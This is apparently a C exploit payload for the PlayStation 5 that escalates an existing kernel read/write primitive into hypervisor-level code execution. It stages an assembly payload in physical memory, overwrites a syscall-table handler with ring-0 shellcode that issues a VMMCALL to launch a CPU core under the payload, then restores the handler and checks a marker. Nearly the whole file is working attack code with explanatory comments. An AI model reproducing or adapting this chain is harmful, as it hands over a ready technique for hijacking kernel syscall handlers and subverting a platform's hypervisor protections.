// trigger.c — ring-0 HCALL 0x0f (khv_startup_mp) via a hijacked syscall handler.
//
// Relapse (or kstuff/etaHEN) gives kernel R/W. This payload uses it to:
//   1. stage ap_launch.S at physical 0x3ffff000 (root-0-executable identity page), and
//   2. execute VMMCALL in RING-0 by overwriting sysent[20].sy_call with our own
//      in-payload function, then invoking syscall 20. PS5 has SMEP off (Relapse's ROP
//      runs userland gadgets in ring-0), so the kernel executes our page fine.
//
// HCALL 0x0f: RAX=id(0xf), RBX=core, RCX=RIP, RDX=CR3.  -> launches core 15 at
// 0x3ffff000 under root 0. Tested WITHOUT S3 first (the one-shot startup_mp bitmap may
// not be consumed on 13.60).
//
// Result: read marker @ DMAP+0x40000000 (strike count + magic) written by the AP.

#include <ps5/kernel.h>
#include <ps5/payload.h>
#include <stdio.h>

extern const intptr_t KERNEL_ADDRESS_DMAP_BASE;

#define AP_RIP          0x3ffff000
#define AP_CR3          0x68000
#define AP_CORE         15
#define MARKER_PA       0x40000000
#define SYSENT_OFF      0x38
#define SYSCALL_STRIDE  24
#define SY_CALL_OFF     8
#define HIJACK_SYSCALL  20   // SYS_getpid on FreeBSD 11.0

// ring-0 VMMCALL shellcode, called by the kernel via the hijacked sy_call.
__attribute__((noinline, used))
static long hv_launch_ap(void) {
    __asm__ volatile(
        "mov $0xf, %%rax\n\t"          // HCALL id: khv_startup_mp
        "mov $15, %%rbx\n\t"           // core 15
        "mov $0x3ffff000, %%rcx\n\t"   // RIP (AP payload)
        "mov $0x68000, %%rdx\n\t"      // CR3 (root-0 identity map)
        "vmmcall\n\t"
        ::: "rax", "rbx", "rcx", "rdx", "memory");
    return 0;
}

static long raw_syscall(long n) {
    long r;
    __asm__ volatile("mov %1, %%rax\n\t"
                     "syscall\n\t"
                     "mov %%rax, %0"
                     : "=r"(r) : "r"(n) : "rax", "rcx", "r11", "memory");
    return r;
}

int main(void) {
    intptr_t kdata = payload_get_args()->kdata_base_addr;
    uint64_t dmap  = (uint64_t)(uintptr_t)KERNEL_ADDRESS_DMAP_BASE;

    FILE *log = fopen("/data/kex_ap.txt", "w");
    if (log) {
        fprintf(log, "kdata=0x%lx dmap=0x%llx\n", (unsigned long)kdata,
                (unsigned long long)dmap);
        fflush(log);
    }

    // 1. stage the AP payload at physical 0x3ffff000 (DMAP write via kernel_copyin)
    extern uint8_t _ap_launch_start[], _ap_launch_end[];
    size_t sz = (size_t)(_ap_launch_end - _ap_launch_start);
    int32_t rv = kernel_copyin(_ap_launch_start, (intptr_t)(dmap + AP_RIP), sz);
    if (log) { fprintf(log, "stage sz=%zu copyin_rv=%d\n", sz, rv); fflush(log); }

    // 2. clear the marker page
    kernel_setlong((intptr_t)(dmap + MARKER_PA), 0);
    kernel_setlong((intptr_t)(dmap + MARKER_PA + 8), 0);

    // 3. hijack sysent[HIJACK_SYSCALL].sy_call -> our ring-0 vmmcall fn
    intptr_t slot = kdata + SYSENT_OFF + HIJACK_SYSCALL * SYSCALL_STRIDE + SY_CALL_OFF;
    uint64_t orig = kernel_getlong(slot);
    if (log) { fprintf(log, "sysent[%d] @ 0x%lx orig=0x%llx\n", HIJACK_SYSCALL,
                        (unsigned long)slot, (unsigned long long)orig); fflush(log); }

    kernel_setlong(slot, (uint64_t)(uintptr_t)&hv_launch_ap);

    // 4. invoke the hijacked syscall -> ring-0 VMMCALL -> HCALL 0x0f
    long rc = raw_syscall(HIJACK_SYSCALL);
    if (log) { fprintf(log, "hijack syscall rc=%ld\n", rc); fflush(log); }

    // 5. restore the original handler
    kernel_setlong(slot, orig);

    // 6. read the marker (strike count + magic) written by the AP payload
    uint64_t count = kernel_getlong((intptr_t)(dmap + MARKER_PA));
    uint64_t magic = kernel_getlong((intptr_t)(dmap + MARKER_PA + 8));
    if (log) {
        fprintf(log, "marker count=%llu magic=0x%llx\n",
                (unsigned long long)(count & 0xffffffff),
                (unsigned long long)(magic & 0xffffffff));
        fprintf(log, "RESULT: %s\n",
                (magic == 0xdeadbeefull) ? "AP RAN" : "AP DID NOT RUN");
        fflush(log);
    }
    if (log) fclose(log);
    return 0;
}
